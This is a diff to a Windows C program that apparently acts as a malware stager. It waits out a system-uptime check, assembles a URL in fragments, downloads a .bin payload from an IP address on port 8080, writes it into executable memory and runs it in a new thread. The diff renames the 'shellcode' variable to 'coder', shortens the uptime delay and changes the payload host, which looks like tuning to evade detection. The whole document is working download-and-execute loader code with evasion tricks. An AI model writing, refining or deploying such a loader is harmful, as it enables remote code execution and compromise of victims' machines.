@@ -24,18 +24,17 @@ int main(){
         HINTERNET hInternet = NULL, hUrlFile = NULL;
         BYTE buffer[1024];
         DWORD bytesRead;
-        BYTE *shellcode = NULL;
+        BYTE *coder = NULL;
         DWORD totalBytes = 0;
         DWORD tickCount = GetTickCount();
     
-if (tickCount > 60000) {
+if (tickCount > 40000) {
 
           // Initialize WinINet
         char url[100]; // Ensure this is large enough to hold the final string
-        strcpy(url, "http:/192.167.244");
-        strcat(url, ".255/");
-        strcat(url, "RACIAL_MANTLE.bin");// Replace with your URL to payload
-        printf("%s",url);
+        strcpy(url, "http://192.168.147");
+        strcat(url, ".128:8080/");
+        strcat(url, "DIFFICULT_BEHAVIOR.bin");// Replace with your URL to payload
         hInternet = InternetOpen("WinINetExample", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
           if (!hInternet) {
                printf("InternetOpen failed. Error: %lu\n", GetLastError());
@@ -49,16 +48,16 @@ if (tickCount > 60000) {
           }
 
         while (InternetReadFile(hUrlFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
-        BYTE *temp = realloc(shellcode, totalBytes + bytesRead);
+        BYTE *temp = realloc(coder, totalBytes + bytesRead);
         if (!temp) {
             printf("Memory allocation failed.\n");
-            free(shellcode);
+            free(coder);
             InternetCloseHandle(hUrlFile);
             InternetCloseHandle(hInternet);
         }
-        shellcode = temp;
+        coder = temp;
         
-        memcpy(shellcode + totalBytes, buffer, bytesRead);
+        memcpy(coder + totalBytes, buffer, bytesRead);
         totalBytes += bytesRead;
             }
   
@@ -70,10 +69,10 @@ if (tickCount > 60000) {
             int j= 0;
             vaex alloc =(vaex)GetProcAddress(hKernel32,"VirtualAlloc");
             LPVOID alloc_mem = alloc(NULL, totalBytes, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            //printf("Error2: %lu\n", GetLastError());
-            memcpy(alloc_mem, shellcode, totalBytes);
-            //printf("Error3: %lu\n", GetLastError());
-            free(shellcode);
+            printf("Error2: %lu\n", GetLastError());
+            memcpy(alloc_mem, coder, totalBytes);
+            printf("Error3: %lu\n", GetLastError());
+            free(coder);
             Sleep(5000);
              HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
             if (!hThread) {
@@ -85,7 +84,7 @@ if (tickCount > 60000) {
 
             CloseHandle(hThread);
             VirtualFree(alloc_mem, 0, MEM_RELEASE); 
-            //printf("Error4: %lu\n", GetLastError());
+            printf("Error4: %lu\n", GetLastError());
             Sleep(5000);
             return 0;
          }
